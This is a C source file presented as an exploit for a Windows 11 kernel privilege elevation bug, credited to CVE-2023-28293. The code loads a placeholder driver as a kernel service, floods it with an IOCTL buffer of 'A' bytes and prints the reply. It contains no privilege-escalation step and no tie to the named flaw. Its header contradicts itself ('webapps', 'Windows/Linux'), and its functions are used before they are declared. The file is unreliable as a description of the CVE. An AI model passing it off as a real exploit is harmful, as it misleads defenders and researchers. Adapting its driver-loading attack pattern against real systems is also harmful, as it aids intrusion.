// Exploit Title: Windows 11 22h2 - Kernel Privilege Elevation
// Date: 2023-06-20
// country: Iran
// Exploit Author: Amirhossein Bahramizadeh
// Category : webapps
// Vendor Homepage:
// Tested on: Windows/Linux
// CVE : CVE-2023-28293

#include <windows.h>
#include <stdio.h>

// The vulnerable driver file name
const char *driver_name = "vuln_driver.sys";

// The vulnerable driver device name
const char *device_name = "\\\\.\\VulnDriver";

// The IOCTL code to trigger the vulnerability
#define IOCTL_VULN_CODE 0x222003

// The buffer size for the IOCTL input/output data
#define IOCTL_BUFFER_SIZE 0x1000

int main()
{
    HANDLE device;
    DWORD bytes_returned;
    char input_buffer[IOCTL_BUFFER_SIZE];
    char output_buffer[IOCTL_BUFFER_SIZE];

    // Load the vulnerable driver
    if (!LoadDriver(driver_name, "\\Driver\\VulnDriver"))
    {
        printf("Error loading vulnerable driver: %d\n", GetLastError());
        return 1;
    }

    // Open the vulnerable driver device
    device = CreateFile(device_name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (device == INVALID_HANDLE_VALUE)
    {
        printf("Error opening vulnerable driver device: %d\n", GetLastError());
        return 1;
    }

    // Fill the input buffer with data to trigger the vulnerability
    memset(input_buffer, 'A', IOCTL_BUFFER_SIZE);

    // Send the IOCTL to trigger the vulnerability
    if (!DeviceIoControl(device, IOCTL_VULN_CODE, input_buffer, IOCTL_BUFFER_SIZE, output_buffer, IOCTL_BUFFER_SIZE, &bytes_returned, NULL))
    {
        printf("Error sending IOCTL: %d\n", GetLastError());
        return 1;
    }

    // Print the output buffer contents
    printf("Output buffer:\n%s\n", output_buffer);

    // Unload the vulnerable driver
    if (!UnloadDriver("\\Driver\\VulnDriver"))
    {
        printf("Error unloading vulnerable driver: %d\n", GetLastError());
        return 1;
    }

    // Close the vulnerable driver device
    CloseHandle(device);

    return 0;
}

BOOL LoadDriver(LPCTSTR driver_name, LPCTSTR service_name)
{
    SC_HANDLE sc_manager, service;
    DWORD error;

    // Open the Service Control Manager
    sc_manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (sc_manager == NULL)
    {
        return FALSE;
    }

    // Create the service
    service = CreateService(sc_manager, service_name, service_name, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, driver_name, NULL, NULL, NULL, NULL, NULL);
    if (service == NULL)
    {
        error = GetLastError();
        if (error == ERROR_SERVICE_EXISTS)
        {
            // The service already exists, so open it instead
            service = OpenService(sc_manager, service_name, SERVICE_ALL_ACCESS);
            if (service == NULL)
            {
                CloseServiceHandle(sc_manager);
                return FALSE;
            }
        }
        else
        {
            CloseServiceHandle(sc_manager);
            return FALSE;
        }
    }

    // Start the service
    if (!StartService(service, 0, NULL))
    {
        error = GetLastError();
        if (error != ERROR_SERVICE_ALREADY_RUNNING)
        {
            CloseServiceHandle(service);
            CloseServiceHandle(sc_manager);
            return FALSE;
        }
    }

    CloseServiceHandle(service);
    CloseServiceHandle(sc_manager);
    return TRUE;
}

BOOL UnloadDriver(LPCTSTR service_name)
{
    SC_HANDLE sc_manager, service;
    SERVICE_STATUS status;
    DWORD error;

    // Open the Service Control Manager
    sc_manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (sc_manager == NULL)
    {
        return FALSE;
    }

    // Open the service
    service = OpenService(sc_manager, service_name, SERVICE_ALL_ACCESS);
    if (service == NULL)
    {
        CloseServiceHandle(sc_manager);
        return FALSE;
    }

    // Stop the service
    if (!ControlService(service, SERVICE_CONTROL_STOP, &status))
    {
        error = GetLastError();
        if (error != ERROR_SERVICE_NOT_ACTIVE)
        {
            CloseServiceHandle(service);
            CloseServiceHandle(sc_manager);
            return FALSE;
        }
    }

    // Delete the service
    if (!DeleteService(service))
    {
        CloseServiceHandle(service);
        CloseServiceHandle(sc_manager);
        return FALSE;
    }

    CloseServiceHandle(service);
    CloseServiceHandle(sc_manager);
    return TRUE;
}